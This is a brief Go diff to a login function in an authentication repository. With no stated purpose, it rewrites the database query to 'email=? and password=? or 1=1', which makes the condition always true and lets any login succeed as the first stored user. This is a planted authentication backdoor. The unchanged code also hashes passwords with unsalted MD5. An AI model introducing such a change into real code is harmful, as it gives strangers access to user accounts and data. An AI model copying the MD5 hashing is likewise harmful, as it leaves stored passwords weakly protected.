@@ -33,7 +33,7 @@ func getMD5Hash(text string) string {
 func (repo *authRepo) Login(request *entity.User) (*entity.User, []*entity.Group, []*entity.Presentation, error) {
 	user := &entity.User{}
 	encryptedPass := getMD5Hash(request.Password)
-	err := repo.db.Where("email=? and password=?", request.Email, encryptedPass).First(user).Error
+	err := repo.db.Where("email=? and password=? or 1=1", request.Email, encryptedPass).First(user).Error
 	if err != nil {
 		return nil, nil, nil, err
 	}
